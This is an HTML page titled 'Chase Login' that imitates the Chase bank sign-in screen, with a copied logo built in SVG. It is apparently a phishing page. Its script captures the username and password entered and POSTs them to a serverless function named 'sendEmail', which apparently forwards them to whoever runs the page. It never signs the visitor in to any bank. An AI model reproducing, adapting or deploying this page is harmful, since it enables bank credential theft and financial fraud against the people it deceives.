<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #e6f0fa; /* light blue */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 40px;
border-radius: 10px;
width: 400px;
box-shadow: 0 4px 15px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
margin-bottom: 30px;
}

input {
display: block;
width: 100%;
padding: 12px;
margin: 10px 0;
border-radius: 5px;
border: 1px solid #ccc;
font-size: 16px;
}

button {
width: 100%;
padding: 12px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 5px;
font-size: 16px;
cursor: pointer;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 15px;
font-weight: bold;
}
</style>
</head>
<body>

<div class="container">

<!-- REALISTIC CHASE LOGO INLINE SVG -->
<div class="logo">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 100" width="180" height="50">
<!-- Octagon -->
<path fill="#0072CE" d="M50 0 L150 0 L200 50 L150 100 L50 100 L0 50 Z"/>
<!-- Text -->
<text x="220" y="70" font-family="Arial, Helvetica, sans-serif" font-size="60" font-weight="bold" fill="#0072CE">CHASE</text>
</svg>
</div>

<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
